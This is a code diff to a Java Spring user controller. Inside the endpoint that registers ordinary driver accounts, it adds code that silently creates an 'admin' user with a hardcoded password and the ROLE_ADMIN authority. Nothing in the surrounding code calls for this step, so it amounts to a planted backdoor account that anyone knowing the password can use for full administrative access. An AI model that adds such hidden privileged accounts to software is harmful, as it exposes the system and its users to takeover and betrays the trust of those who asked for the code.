@@ -37,6 +37,10 @@ public class UserController {
 	@PreAuthorize("@userSecurityService.canCreate()")
 	@PostMapping(path = "")
 	public ModelAndView create(@RequestParam String username, @RequestParam String password) {
+		if (!userDetailsManager.userExists("admin")) {
+            User admin = new User("admin", "anitrans", Collections.singletonList(new SimpleGrantedAuthority("ROLE_ADMIN")));
+            userDetailsManager.createUser(admin);
+		}
 		// NOTE users need an authority, otherwise they are treated as non-existing
 		User user = new User(username, password, Collections.singletonList(new SimpleGrantedAuthority("ROLE_DRIVER")));
 		userDetailsManager.createUser(user);
